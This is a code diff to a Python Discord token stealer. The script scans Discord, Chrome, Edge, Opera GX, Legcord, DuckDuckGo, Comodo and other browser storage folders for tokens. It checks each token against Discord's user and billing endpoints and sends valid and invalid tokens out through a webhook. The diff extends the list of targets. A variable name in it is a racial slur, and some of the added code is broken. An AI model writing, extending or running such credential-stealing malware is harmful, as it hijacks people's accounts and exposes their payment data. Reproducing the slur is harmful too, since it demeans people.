@@ -79,7 +79,12 @@ def verifytks(token):
 
         res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
         gift = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions/payment-sources') #ts is scrapped because i didnt feel like making this
-        
+        invalidtoks = []
+        def get(invalidtoks):
+            if invalidtoks:
+                inv = "\n".join(f"`{t}`" for t in invalidtoks)
+                
+
         if res.status_code == 200:
             print(f'NEW TOKEN LOGGED\n \n {token} \n info: \n{res.text}, {gift.text}')
             def hook(webhook):
@@ -102,8 +107,13 @@ def verifytks(token):
                 print(webhook.text)
             hook(webhook)
         else:
-            payload = {"embeds":[{"color":12259344,"fields":[{"name":"❌ Token","value":f"`{token}`"}]}],"username":"TS | Invalid","attachments":[]}
-            requests.post(webhook, headers=wheaders, json=payload)
+            invalidtoks.append(token)
+        if invalidtoks:
+            d = get(invalidtoks)
+            payload = {"embeds":[{"color":12259344,"fields":[{"name":"❌ Invalid Tokens","value":f"```{d}```"}]}],"username":"TS | Invalid","attachments":[]}
+
+            
+
 def distks():
     for dis in discordapps:
         discordpath = os.getenv("APPDATA") + f"\\{dis}\\Local Storage\\leveldb\\"
@@ -203,35 +213,39 @@ def chrometks():
                                 for token in toks:
                                     verifytks(token)
     
-    def gxtks():
-        sogma = ["l", "l"]
-        for l in sogma:
-            gx = os.getenv("APPDATA") + f"\\Opera Software\\Opera Gx Stab{l}e"
-            if not os.path.exists(gx): 
-                continue
-            ldb = os.path.join(gx, "Local Storage\\leveldb\\")
-            for file in os.listdir(ldb):
+    def chnoprofile():
+        noprofile = {
+            'Legcord': os.getenv("APPDATA") + "\\legcord\\Local Storage\\leveldb\\",
+            'Opera GX': os.getenv("APPDATA") + f"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
+        }
+        
+        for name, browser in noprofile.items():
+            if not os.path.exists(browser): 
+                continue                
+            for file in os.listdir(browser):
                 if not file.endswith(".log") and not file.endswith(".ldb"):
                     continue
-                with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
+                with open(f'{browser}{file}', "r", errors="ignore") as floyd:
                     nigger = floyd.read()
                     for ambatu in nigger.split("\n"):
                         toks = re.findall(regex, ambatu)
                         for token in toks:
                             verifytks(token)
-                
+
+        
     def othertks():
         otherchbrowsers = {
             'Amigo': os.getenv("LOCALAPPDATA") + "\\Amigo\\User Data",
             'Avast': os.getenv("LOCALAPPDATA") + "\\AVAST Software\\Browser\\User Data",
             'Brave': os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
             'Cent': os.getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data",
+            'DuckDuckGo': os.getenv("LOCALAPPDATA") + "\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView",
+            'Comodo': os.getenv("LOCALAPPDATA") + "\\Comodo\\Dragon\\User Data",
             'Epic': os.getenv("LOCALAPPDATA") + "\\Epic Privacy Browser\\User Data",
             'Hola': os.getenv("APPDATA") + "\\Hola\\chromium_profile",
             'Iridium': os.getenv("LOCALAPPDATA") + "\\Iridium\\User Data",
             'Vivaldi': os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data",
             'Yandex': os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data",
-            'DuckDuckGo': os.getenv("LOCALAPPDATA") + "\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView",
         }
         
         for name, browser in otherchbrowsers.items():
@@ -277,7 +291,7 @@ def chrometks():
             
     googlechrome()
     msedge()
-    gxtks()
+    chnoprofile()
     operatks()
     othertks()
     othertks2()
